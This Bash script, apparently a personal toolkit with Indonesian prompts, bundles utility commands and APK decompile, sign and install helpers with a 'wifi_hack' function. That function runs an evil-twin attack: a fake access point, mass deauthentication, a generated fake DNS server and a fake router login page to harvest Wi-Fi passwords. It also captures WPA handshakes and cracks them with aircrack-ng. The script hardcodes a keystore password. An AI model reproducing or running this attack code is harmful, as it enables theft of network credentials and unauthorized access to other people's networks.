#!/bin/bash

#
# editor Nano
# developer sunjangyo12@gamil.com
# update wifi hacking
#

comand="$@"
IP=10.42.0.1
RANG_IP=$(echo $IP | cut -d "." -f 1,2,3);
DUMP_PATH="/var/www/shunpc.com"
allib="/usr/bin/allib"
aktif=`pwd`

# Warna
blanco="\033[1;37m"
gris="\033[0;37m"
magenta="\033[0;35m"
rojo="\033[1;31m"
verde="\033[1;32m"
amarillo="\033[1;33m"
azul="\033[1;34m"
rescolor="\e[0m"

function spiner
{
	local pid=$!
	local delay=0.15
	local spinstr='|/-\'
		while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
			local temp=${spinstr#?}
			printf " [%c]  " "$spinstr"
			local spinstr=$temp${spinstr%"$temp"}
			sleep $delay
			printf "\b\b\b\b\b\b"
		done
	printf "    \b\b\b\b"
}

function cektools {
	toolwifi=0; toolapk=0; toolmain=0
	echo -ne "Aircrack-ng....."
	if ! hash aircrack-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		toolwifi=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Aireplay-ng....."
	if ! hash aireplay-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		toolwifi=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Airmon-ng......."
	if ! hash airmon-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		toolwifi=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Airodump-ng....."
	if ! hash airodump-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		toolwifi=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Dhcpd..........."
	if ! hash dhcpd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor" (isc-dhcp-server)"
		toolwifi=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Hostapd........."
	if ! hash hostapd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		toolwifi=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Apktool........."
	if ! hash apktool 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor" apt install apktool"
		toolapk=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Curl............"
	if ! hash curl 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		toolmain=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Main-Library...."
	if [ ! -d $allib 2>/dev/null ]; then
		echo -e "\e[1;31mNot Installed"$rescolor" /usr/bin/ cari (google) sunjangyo12 github my_bash"
		toolmain=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Create_ap......."
	if ! hash create_ap 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor" googel create_ap github"
		toolwifi=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Lighttpd........"
	if ! hash lighttpd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor"apt install lighttpd"
		toolwifi=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Mdk3............"
	if ! hash mdk3 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		toolwifi=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "adb............."
	if ! [ -f /usr/bin/adb ]; then
		echo -e "\e[1;31mNot installed"$rescolor""
		toolapk=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	sleep 1
	echo -e "\n\n"
}

echo ""
echo "##############  $comand  #############"
echo "TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT"
echo ""


function wifi_hack()
{
	iwconfig
	read -p "[?] interface Name   --------   : " wifin
	read -p "[?] monitor? ENTER adalah mon0  : " wifimon
	read -p "[?] evil/brute e/b?  --------   : " wif
	wifmon="mon0"
	wifsave="/home/sunjangyo12/wifi"
	wiftmp="/tmp/wifihacking"
	wifserver="/usr/bin/allib/fakelogin/tplink"
	if [ "$wifimon" != "" ]; then
		wifmon="$wifimon"
	fi
	if [ ! -d $wifsave ]; then
		mkdir -p $wifsave
	fi
	if [ ! -d $wiftmp ]; then
		mkdir -p $wiftmp
	fi

	airmon-ng start "$wifin"
	if [ "$wif" = "e" ]; then
		buatfakedns & buatserver
		fuser -n tcp -k 53 67 80 &
		fuser -n udp -k 53 67 80
		xterm -e openssl req -subj '/CN=SEGURO/O=SEGURA/OU=SEGURA/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout $wifsave/server.pem -out $wifsave/server.pem
		echo "############ sample ###############"
		echo "aireplay-ng -O O -a <ssid> -c <station> --ignore-negative-one mon0"
		read -p "[?] Nama Fake wifi : " wifen
		read -p "[?] Nama BSSID     : " wifeb
		xterm -bg "#000000" -fg "#00aa00" -title "Fake Wifi" -e create_ap "$wifin" "$wifen" &
		xterm -bg "#000000" -fg "#FF0009" -title "Deauth all" -e aireplay-ng -0 0 -a "$wifeb" --ignore-negative-one $wifmon &
		sleep 10 &
		xterm -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" -e "if type python2 >/dev/null 2>/dev/null; then python2 $wifsave/fakedns; else python $wifsave/fakedns; fi" &
		sleep 17 &
		iptables --flush
  		iptables --table nat --flush
  		iptables --delete-chain
  		iptables --table nat --delete-chain
  		iptables -P FORWARD ACCEPT
  		iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
		iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $IP:443
  		iptables -A INPUT -p tcp --sport 443 -j ACCEPT
  		iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
  		iptables -t nat -A POSTROUTING -j MASQUERADE
		killall lighttpd
		lighttpd -f $wifsave/lighttpd.conf
		read -p "[+] ENTER FOR DESTROY ALL"

		sysctl -w net.ipv4.ip_forward=0
		iptables --flush
    		iptables --table nat --flush
    		iptables --delete-chain
    		iptables --table nat --delete-chain
		iptables -w -t nat -I POSTROUTING -s $IP/24 ! -o ap0 -j MASQUERADE || die
    		iptables -w -I FORWARD -i ap0 -s $IP/24 -j ACCEPT || die
    		iptables -w -I FORWARD -i wlp9s0 -d $IP/24 -j ACCEPT || die
    		DNS_PORT=5353
    		iptables -w -I INPUT -p tcp -m tcp --dport 5353 -j ACCEPT || die
    		iptables -w -I INPUT -p udp -m udp --dport 5353 -j ACCEPT || die
    		iptables -w -t nat -I PREROUTING -s $IP/24 -d $IP \ -p tcp -m tcp --dport 53 -j REDIRECT --to-ports 5353 || die
    		iptables -w -t nat -I PREROUTING -s $IP/24 -d $IP \ -p udp -m udp --dport 53 -j REDIRECT --to-ports 5353 || die
    		airmon-ng stop mon0
    		killall lighttpd

	elif [ "$wif" = "b" ];then
		read -p "[?] online/offline? on/of : " wifb
		if [ "$wifb" = "on" ]; then
			xterm -title "cari informasi wifi" -e airodump-ng $wifmon -w $wiftmp/hand
			cat $wiftmp/hand-01.csv
			read -p "[?] MAC address   ---------- : " wifbmac
			read -p "[?] Nomor channel ---------- : " wifbch
			xterm -bg "#000000" -fg "#00AA00" -title "handsake wifi brute online dump-save" -e airodump-ng -c "$wifbch" --bssid "$wifbmac" -w $wifbtmp/hand $wifmon &
			xterm -bg "#000000" -fg "#FF00A4" -title "kill wifi brute online mdk3" -e mdk3 $wifmon d &
			read -p "[+] ENTER JIKA DAPAT HANDSHAKENYA>>> "
			killall xterm
			echo "aircrack-ng -w $wifbw $wiftmp/*.cap &"
			read -p "[?] ~ Nama Wordlist *.txt : " wifbw
			xterm -e aircrack-ng -w ~/$wifbw -b $wifbmac $wiftmp/*.cap &

			read -p "[?] simpan handshakes? y/n : " wifbs
			if [ "$wifbs" = "y" ]; then
				read -p "[+] Nama handsake : " wifbsn
				cd $wifsave; mkdir "$wifbsn"
				mv $wiftmp/* "$wifbsn"
			else
				echo "[+] remove all handsake"
				rm $wiftmp/*
			fi
		elif [ "$wifb" = "of" ]; then
			read -p "[?] ~ Nama Wordlist *.txt : " wifbw
			ls $wifsave
			read -p "[?] Nama wifi : " wifbh
			echo "aircrack-ng -w $wifbw $wiftmp/*.cap &"
			cd; aircrack-ng -w $wifbw $wifsave/$wifbh/*.cap &
		else
			echo "wifi input error"
		fi
	fi
}

function android_build()
{
	export PROJ=`pwd`/$nbapk
	sudo chmod 777 -R $PROJ
        export LIBPROJ=/usr/bin/allib/build-tools

	cd $LIBPROJ
	if [ "$nbapk" == "" ]; then
		echo -e "\e[1;31m[!] Nama project dan paket kosong"
		exit
	fi
	if [ ! -d "$PROJ/obj" ]; then mkdir $PROJ/obj; fi
	if [ ! -d "$PROJ/bin" ]; then mkdir $PROJ/bin; fi
	echo  "[+] Buat file R.java --->>"
	./aapt package -f -m -J $PROJ/src -M $PROJ/AndroidManifest.xml -S $PROJ/res -I $LIBPROJ/android.jar
	cd $PROJ
	clagi="y"
	while [ $clagi = "y" ]; do
		read -p "[?] compile y/n : " EPROJ
		if [ "$EPROJ" = "y" ]; then
			echo "###################### `date` #####"
			javac -d obj -classpath src -bootclasspath $LIBPROJ/android.jar src/$pbapk/*.java
		else
			clagi="n"
		fi
	done
	cd $LIBPROJ
	echo "[+] Dexing -->> "
	./dx --dex --output=$PROJ/bin/classes.dex $PROJ/obj >/dev/null
	echo "[+] Build apk -->> "
	./aapt package -f -m -F $PROJ/bin/out.apk -A $PROJ/assets -M $PROJ/AndroidManifest.xml -S $PROJ/res -I $LIBPROJ/android.jar >/dev/null
	cp $PROJ/bin/classes.dex .
	./aapt add $PROJ/bin/out.apk classes.dex  >/dev/null
	./aapt list $PROJ/bin/out.apk  >/dev/null
	echo  "[+] Signing apk -->> "
	jarsigner -verbose -keystore $allib/sign/shun.keystore -storepass "#pesawat" -keypass "#pesawat" -digestalg SHA1 -sigalg MD5withRSA $PROJ/bin/out.apk mykey  >/dev/null
	echo ""
	echo "###### SUKSES ######"
	echo ""
	echo "path   : $PROJ/bin/out.apk"
	echo "install: adb install $PROJ/bin/out.apk"
	read -p "[?] Install? y/n : " ins
	if [ "$ins" = "y" ]; then
		spbapk=($(echo "$pbapk" | tr '/' '\n'))
		for i in "${!spbapk[@]}"; do
			echo -ne "${spbapk[i]}."
		done
		echo ""
		read -p "[?] masukan paket (com.sample) : " tpbapk
		adb uninstall "$tpbapk"; sleep 3
		adb install "$PROJ/bin/out.apk"
	fi
}

function android_pull_apk()
{
	cd $allib/build-tools
	if [ -z "$1" ]; then
		echo "Anda harus lulus paket untuk fungsi ini"
		echo "Ex: android_pull_apk \"com.android.contacts\""
		return 1
	fi
	if [ -z "$(./adb shell pm list packages | grep $1)" ]; then
		echo "invalid packet list!"
		return 1
	fi
	apk_path="`./adb shell pm path $1 | sed -e 's/package://g' | tr '\n' ' ' | tr -d '[:space:]'`"
	apk_name="`basename ${apk_path} | tr '\n' ' ' | tr -d '[:space:]'`"
	destination="/home/sunjangyo12/Dokumen/android/apk/"
	./adb pull ${apk_path} ${destination}
	echo -e "\nAPK simpan di $destination/$paket"
	cd "$destination/"
	mv $apk_name $paket".apk"
	chmod 777 $paket".apk"
}
function data_apk(){
	pathdapk=$allib/build-tools
	cd $pathdapk
	if [ -z "$1" ]; then
		echo "Anda harus lulus paket untuk fungsi ini"
		echo "Ex: android_pull_apk \"com.android.contacts\""
		return 1
	fi
	if [ -z "$(./adb shell pm list packages | grep $1)" ]; then
		echo "invalid packet list!"
		return 1
	fi
	apk_path="`./adb shell pm path $1 | sed -e 's/package://g' | tr '\n' ' ' | tr -d '[:space:]'`"
	apk_name="`basename ${apk_path} | tr '\n' ' ' | tr -d '[:space:]'`"
	destination="/home/sunjangyo12/Dokumen/android/cache"

	read -p "backup atau kembalikan cache:  b/k : " rest
	if [ "$rest" = "b" ]; then
		./adb backup -f $paket".ab" $paket
		mv "$pathdapk/$paket".ab $destination
		echo -e "\nCache APK tersimpan "
	fi
	if [ "$rest" = "k" ]; then
		read -p "Yakin mau KEMBALIKAN? y/t: " alert
		if [ "$alert" = "y" ]; then
			ls -l $destination
			read -p "Masukan ab file: " abf
			./adb restore "$destination/$abf"
		fi
	fi
}

function apk_to_class() {
	read -p "-->> Nama apk [tanpa tanda petik biarkan spasi] : " dnapk
	diratc="/home/sunjangyo12/oprek/smali/"
	vclass=$allib/vclasslib

	control=`ls $diratc | grep "$dnapk"`
	read -p "Apakah--[ $dnapk ]-- y/n: " tesdnapk

	if [ "$control" = "$dnapk" ]; then
		read -p "-- file sudah ada ganti? y/t : " g
		if [ "$g" = "y" ]; then
			rm -R "$diratc$dnapk"
			apk_to_class
		fi
	elif [ "$tesdnapk" = "n" ]; then
		apk_to_class
	elif [ "$dnapk" = "" ]; then
		echo "Erro: nama kosong"
		apk_to_class
	else
		mkdir "$diratc$dnapk"
		cp "$dnapk" "$diratc$dnapk"
		cd "$diratc$dnapk"
		apktool d "$dnapk"
		mkdir java
		mv "$dnapk" java
		cd java
		echo "[+] dex to class"
		bash $allib/dex2jar/d2j-dex2jar.sh "$dnapk"
		find_jar=`ls | grep *.jar`
		a=`unzip "$find_jar"`
		at=($(echo "$a" | tr ':' '\n'))

		read -p "Apakah semua class mau diubah ke java? y/t: " jcontrol

		for i in "${!at[@]}"; do
			if [ $jcontrol = "y" ]; then
				if [ ${at[i]} = "inflating" ]; then
					jsplit=($(echo "${at[i+1]}" | tr '.' '\n'))
					echo "[+] $jsplit".java
					java -jar $vclass/lib1.jar "${at[i+1]}" > $jsplit".java"
				elif [ ${at[i]} = "creating" ]; then
					folder="${at[i+1]}"
					echo ""
					echo "[=] proses di folder: $folder"
				fi
			fi
		done
		echo "<<< tersimpan di  $diratc$dnapk >>"
	fi
}

function buatfakedns {
	echo "import socket

class DNSQuery:
  def __init__(self, data):
    self.data=data
    self.dominio=''

    tipo = (ord(data[2]) >> 3) & 15
    if tipo == 0:
      ini=12
      lon=ord(data[ini])
      while lon != 0:
        self.dominio+=data[ini+1:ini+lon+1]+'.'
        ini+=lon+1
        lon=ord(data[ini])

  def respuesta(self, ip):
    packet=''
    if self.dominio:
      packet+=self.data[:2] + \"\x81\x80\"
      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
      packet+=self.data[12:]
      packet+='\xc0\x0c'
      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.')))
    return packet

if __name__ == '__main__':
  ip='$IP'
  print 'pyminifakeDwebconfNS:: dom.query. 60 IN A %s' % ip

  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  udps.bind(('',53))

  try:
    while 1:
      data, addr = udps.recvfrom(1024)
      p=DNSQuery(data)
      udps.sendto(p.respuesta(ip), addr)
      print 'Request: %s -> %s' % (p.dominio, ip)
  except KeyboardInterrupt:
    print 'Finalizando'
    udps.close()" > $wifsave/fakedns
        chmod +x $wifsave/fakedns
}

function buatserver {
	  echo "server.document-root = \"$wifserver/\"

  server.modules = (
    \"mod_access\",
    \"mod_alias\",
    \"mod_accesslog\",
    \"mod_fastcgi\",
    \"mod_redirect\",
    \"mod_rewrite\"
  )

  fastcgi.server = ( \".php\" => ((
                  \"bin-path\" => \"/usr/bin/php-cgi\",
                  \"socket\" => \"/php.socket\"
                )))

  server.port = 80
  server.pid-file = \"/var/run/lighttpd.pid\"
  # server.username = \"www\"
  # server.groupname = \"www\"

  mimetype.assign = (
  \".html\" => \"text/html\",
  \".htm\" => \"text/html\",
  \".txt\" => \"text/plain\",
  \".jpg\" => \"image/jpeg\",
  \".png\" => \"image/png\",
  \".css\" => \"text/css\"
  )


  server.error-handler-404 = \"/\"

  static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
  index-file.names = ( \"index.htm\", \"index.html\" )

  \$SERVER[\"socket\"] == \":443\" {
        url.redirect = ( \"^/(.*)\" => \"http://www.router.com\")
        ssl.engine                  = \"enable\"
        ssl.pemfile                 = \"$DUMP_PATH/server.pem\"

  }

  #Redirect www.domain.com to domain.com
  \$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
        url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
        ssl.engine                  = \"enable\"
        ssl.pemfile                 = \"$DUMP_PATH/server.pem\"
  }
  " >$wifsave/lighttpd.conf
}

function hotspot {

	nmcli connection add type wifi ifname '*' con-name ai_otak autoconnect no ssid "shun"
	nmcli connection modify ai_otak 802-11-wireless.mode ap 802-11-wireless.band bg ipv4.method shared
	nmcli connection up ai_otak
	echo "sukses klon hotspot"
}

if [ "$comand" = "wifi" ]; then
	read -p "on(ENTER)/of : " sw
	if [ "$sw" = "of" ]; then
		nmcli connection down ai_otak
	else
		hotspot
	fi
elif [ "$comand" = "file_gui" ]; then
	echo "xubuntu:thunar"
elif [ "$comand" == "apkkey" ] && [ "$comand" != 1 ]; then
	echo "sign      : biasanya setelah edit smali Sign diperlukan"
	echo "backup    : pastikan usb tersambung > wizard"
	echo "decompile : Masukan nama apk dan otomatis tersimpan di ~/hack/smali"
	echo "compile   : pastikan ada di folder yang ada file apktool.yml >wizard"
	echo "build     : buat project android > wizard"
	echo "vclass    : class ke java > wizard"
	read -p "-->> Perintah: " napk

	if [ "$napk" = "decompile" ]; then
		read -p "[?] semua atau jar s/j? : " dapk
		if [ $dapk = "s" ]; then
			apk_to_class
		else
			read -p "[?] Nama jar/apk: " njdapk
			bash $allib/dex2jar/d2j-dex2jar.sh "$njdapk"
		fi
	elif [ "$napk" = "vclass" ]; then
		vclass=$allib/vclasslib
		read -p "[?] Nama class: " vcapk
		java -jar $vclass/lib1.jar "$vcapk" > $vcapk".java"
		cat $vcapk".java"
	elif [ "$napk" = "build" ]; then
		read -p "[?] compile/baru? c/b : " bapk
		lagi="y"
		while [ "$lagi" = "y" ]; do
			if [ "$bapk" = "b" ]; then
				ls; read -p "[?] Nama project BUKAN STRING : " nbapk
				if [ "`find $nbapk/AndroidManifest.xml`" != "" ]; then
					cat "$nbapk/"AndroidManifest.xml
				fi
			        read -p "[?] Nama paket (com/oke)    : " pbapk
				read -p "[?] libs ENTER if NOTING    : " lbapk
				mkdir $nbapk; cd $nbapk
				mkdir -p src/$pbapk; mkdir assets
				mkdir obj; mkdir bin; mkdir -p res/layout
				mkdir res/values; mkdir res/drawable
				if [ "$lbapk" != "" ]; then
					mkdir libs
				fi
				defbapk="$allib/build-tools/main"
				cat $defbapk/AndroidManifest.xml > AndroidManifest.xml
				cat $defbapk/MainActivity.java > src/$pbapk/MainActivity.java
				cat $defbapk/strings.xml > res/values/strings.xml
				cat $defbapk/main.xml > res/layout/main.xml
				cat $defbapk/styles.xml > res/values/styles.xml
				echo "folder dibuat"
			else
				ls; read -p "[?] Nama project BUKAN STRING : " nbapk
				if [ "`find $nbapk/AndroidManifest.xml`" != "" ]; then
					cat "$nbapk/"AndroidManifest.xml
				fi
			        read -p "[?] Nama paket (com/oke)    : " pbapk
				android_build
			fi
			cd "$aktif"
			read -p "[?] Lagi? y/n : " lagi
		done
	elif [ "$napk" = "sign" ]; then
		read -p "--->> Masukan nama apk: " snapk
		echo "[+] signing ..."
		jarsigner -verbose -keystore $allib/sign/shun.keystore -storepass "#pesawat" -keypass "#pesawat" -digestalg SHA1 -sigalg MD5withRSA $snapk mykey
                ls
	elif [ "$napk" = "compile" ]; then
		apktool b
		cd dist
		rm out.apk
		ncapk=`ls | grep "apk"`
		echo "[+] sign apk ...."
		jarsigner -verbose -keystore $allib/sign/shun.keystore -storepass "#pesawat" -keypass "#pesawat" -digestalg SHA1 -sigalg MD5withRSA $ncapk mykey  >/dev/null
		read -p "[+] Install y/n : " icapk
		if [ "$icapk" != "" ]; then
                	adb install  $ncapk
		fi
		ls
	elif [ "$napk" = "backup" ]; then
		lagi="y"
		while [ $lagi = "y" ]; do
			read -p "-->> Masukan nama/ENTER semua: " npaket
			nrpaket=""
			cd $allib/build-tools
			if [ "$npaket" = "" ]; then
				nrpaket=`./adb shell pm list packages`
			else
				nrpaket=`./adb shell pm list packages | grep "$npaket"`
			fi
			nspaket=($(echo "$nrpaket" | tr ':' '\n'))
			for i in "${!nspaket[@]}"; do
				if [ ${nspaket[i]} = "package" ]; then
					jsplit=($(echo "${nspaket[i+1]}" | tr ':' '\n'))
					echo "$jsplit"
				fi
			done
			read -p "-->> Masukan backup package: " paket
			read -p "-->> Pilih data atau apk? d/a: " pil

			if [ "$pil" = "d" ]; then
				data_apk $paket
				read -p "[+] Lagi ? y/n : " lagi
			fi
			if [ "$pil" = "a" ]; then
				android_pull_apk $paket
                                read -p "[+] Lagi ? y/n : " lagi

			fi
		done
	else
		echo "Input Error! coba lagi"
	fi
elif [ "$comand" = "git_upload" ]; then
	git init
	git add .
	read -p "masukan commit: " comit
	git commit -m "$comit"
	read -p "masukan http: " http
	git remote add origin "$http"
	git push -f origin master
elif [ "$comand" = "file_zip" ]; then
	read -p "Masukan nama file: " zfile
	if [ "$zfile" = "" ]; then
		echo "nama kosong!"
	else
		zip -r "$zfile".zip "$zfile"
	fi
elif [ "$comand" = "destroy" ]; then
	onDestroy
elif [ "$comand" = "hex" ]; then
	hexeditor
elif [ "$comand" = "otak" ]; then
	buatfakedns & main
elif [ "$comand" = "cerah" ]; then
	MAX=`cat /sys/class/backlight/intel_backlight/max_brightness`
	NOW=`cat /sys/class/backlight/intel_backlight/brightness`

	echo "-->> Maximal : [ $MAX ]"
	echo "-->> Sekarang : [ $NOW ]"
	echo 1500 > /sys/class/backlight/intel_backlight/brightness
	echo "-->> Default : [ 1500 ]"
	read -p "Masukan Kecerahan sekarang : " cer

	if [ "$cer" = "" ]; then
		echo "-->> Memakai default"
	else
		echo "$cer" > /sys/class/backlight/intel_backlight/brightness
		echo "[ $cer ]"
	fi

elif [ "$comand" = "wifi_hack" ]; then
	if [ $toolwifi != "1" ]; then
		wifi_hack
	else
		echo -e "\n\n"$blanco"[!] Tools wifi belum lengkap silahkan install\n"
	fi

elif [ "$comand" = "error" ]; then
	dmesg
elif [ "$comand" = "cache" ]; then
	read -p "[?] baru/lama b/l: " cache
	if [ "$cache" = "b" ]; then
		read -p "[?] Masukan perintah : " pcache
		
	fi
elif [ "$comand" = "edit" ]; then
	cd $allib/sublime
	./sublime_text 2>/dev/null &
elif [ "$comand" = "web" ]; then
	echo "ENTER pencarian langsung bing.com"
	echo "wiki pencarian"
	echo "gambar pencarian"
	echo "wikihow pencarian"
	echo "medis pencarian"
	echo "kamus tranlate"
	read -p "--->> Masukan pencarian: " cari
	if [ "$cari" = "wiki" ]; then
		read -p "--->> Wiki pencarian: " cwiki
		firefox "https://https-en-m-wikipedia-org.0.freebasics.com/wiki/Special:Search?search=$cwiki&go=Go&iorgbsid=AZx5Rz7gY5XA32Wfsp47kpFSZmT-pyijfo0_s4uLGTHKQgG9FfcExqWb7seS-XC_OctWe6UhWzqUWNdpeLw4_dlv&iorg_service_id_internal=803478443041409%3BAfrEX0ng8fF-69Ni" &
	elif [ "$cari" = "gambar" ]; then
		read -p "--->> Gambar pencarian: " cgambar
		firefox "https://http-www-bing-com.0.freebasics.com/images/search?q=$cgambar&FORM=HDRSC2&PC=FBIO&iorg_service_id_internal=803478443041409%3BAfrEX0ng8fF-69Ni" &
	elif [ "$cari" = "wikihow" ]; then
		read -p "--->> wikihow pencarian: " cwikihow
		firefox "https://https-id-m-wikihow-com.0.freebasics.com/wikiHowTo?iorg_service_id_internal=1565619690390248%3BAfqgmp3C64SPmOJI&iorgbsid=AZxWu1SQo_HsH_Om7z5nQ4jGv1esaLuYiQgBQPocrWWngKqH4i6HOQbwAvTzhE8gAKDx8sLdSM_SvZ_5fJtm_Mtv&search=$cwikihow" &
	elif [ "$cari" = "kamus" ]; then
		read -p "--->> text inggris: " ckamus
		firefox "https://https-light-glosbe-com.0.freebasics.com/en/id/$ckamus?iorgbsid=AZxWdzvD3bZYDw-HdcIEKX-o604j3JGy_xJ0ns-zDe9aVpOjoJ_-Q13NAZ6L3Hjy2XOnCTjhtVMvUU7qF8bYWrtk&iorg_service_id_internal=1461090187529366%3BAfohw0qREtWaBNb_" &
	elif [ "$cari" = "medis" ]; then
		read -p "--->> medis pencarian: " cmedis
		firefox "https://https-doktersehat-com.0.freebasics.com/?iorg_service_id_internal=948157001926414%3BAfrzo2s9gv42b-07&search=$cmedis" &
	else
		firefox "https://http-www-bing-com.0.freebasics.com/search?iorg_service_id_internal=803478443041409%3BAfrEX0ng8fF-69Ni&iorgbsid=AZwOf5p9ZGHdo4ma-_4xLROJiPP57wR4JxMMMfZYMk2RHTXt0k_suZhZX4ELlv0Xo8d0A99ibKz2Zk2OYsINpLd4&q=$cari&go=Search&qs=ds&form=QBRE&pc=FBIO" &
	fi
else
	echo "########## INPUT SALAH! ##########"
	echo "##########    v.1.0     ##########"
	echo ""
	echo "--> al web"
	echo "--> al file_gui"
	echo "--> al file_zip"
	echo "--> al git_upload"
	echo "--> al cerah"
	echo "--> al wifi"
	echo "--> al wifi_hack"
	echo "--> al apkkey"
	echo "--> al error"
	echo "--> al edit"
	echo "--> al cache"
	cektools
fi
